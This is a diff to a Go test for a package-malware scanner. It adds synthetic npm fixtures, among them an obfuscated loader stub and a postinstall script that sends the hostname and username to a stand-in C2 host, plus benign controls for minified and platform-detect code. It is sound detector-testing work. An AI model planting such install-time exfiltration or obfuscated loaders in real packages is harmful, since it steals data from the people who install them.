@@ -154,6 +154,22 @@ func TestSyntheticTechniqueCorpus(t *testing.T) {
 			}),
 			wantBlock: true, // destructive-payload critical (setup.py context)
 		},
+		{
+			name: "npm-obfuscator-fingerprint", prevalent: "javascript-obfuscator loader (lodash-twist class)", eco: npm,
+			tarball: testutil.NPMTarball(map[string]string{
+				"package.json": `{"name":"x","main":"index.js"}`,
+				"index.js":     "var _0x1a2b=['bG9n','ZXhpdA=='];function _0x3c4d(_0x5e6f){return _0x1a2b[_0x5e6f];}var _0x7a8b=_0x3c4d(0x0),_0x9c0d=_0x3c4d(0x1);globalThis[_0x7a8b]&&globalThis[_0x7a8b](_0x9c0d,_0x1a2b,_0x3c4d,_0x5e6f);",
+			}),
+			wantBlock: false, // obfuscated-code high -> quarantine (review, not hard-block)
+		},
+		{
+			name: "npm-install-host-recon-exfil", prevalent: "host/user recon stealer (login-paypal class)", eco: npm,
+			tarball: testutil.NPMTarball(map[string]string{
+				"package.json": `{"name":"x","scripts":{"postinstall":"node index.js"}}`,
+				"index.js":     "const os=require('os');const d=JSON.stringify({h:os.hostname(),u:process.env.USER});require('https').request('https://recon.fake-c2.example',{method:'POST'}).end(d);",
+			}),
+			wantBlock: false, // host-recon-exfil high (install-time) -> quarantine
+		},
 
 		// ---- behavioral: runtime techniques (synthetic traces) ----
 		{
@@ -254,6 +270,26 @@ func TestSyntheticTechniqueCorpus(t *testing.T) {
 			name: "benign-clean-pypi", prevalent: "control", eco: pypi, benign: true,
 			tarball: testutil.Wheel(map[string]string{"ok/__init__.py": "x = 1\n"}),
 			trace:   traceJSON(nil, nil, nil, []behavior.DNSRecord{dnsQ("files.pythonhosted.org")}),
+		},
+		{
+			// Precision guard for obfuscated-code: terser/esbuild minification uses
+			// short alphanumeric names, not _0x-hex, so it must NOT trip the
+			// obfuscator fingerprint (obfuscated-blob info is fine; it doesn't decide).
+			name: "benign-terser-minified-bundle", prevalent: "control: terser/esbuild dist bundle", eco: npm, benign: true,
+			tarball: testutil.NPMTarball(map[string]string{
+				"package.json":  `{"name":"ok","main":"dist/index.js"}`,
+				"dist/index.js": "export function f(e,t){return e.map(function(n){return n*t})}var a=function(e){return e+1};export default a;",
+			}),
+		},
+		{
+			// Precision guard for host-recon-exfil: platform/arch detection to fetch
+			// the right prebuilt binary (esbuild/sharp shape) reads process.platform +
+			// os.arch — neither is an identity primitive — so it must NOT fire.
+			name: "benign-platform-detect-download", prevalent: "control: prebuilt-binary fetch", eco: npm, benign: true,
+			tarball: testutil.NPMTarball(map[string]string{
+				"package.json": `{"name":"ok","scripts":{"postinstall":"node install.js"}}`,
+				"install.js":   "const os=require('os');const url='https://cdn.example/'+process.platform+'-'+os.arch()+'.node';require('https').get(url);",
+			}),
 		},
 		{
 			name: "benign-native-build", prevalent: "control: node-gyp/gcc compile", eco: npm, benign: true,
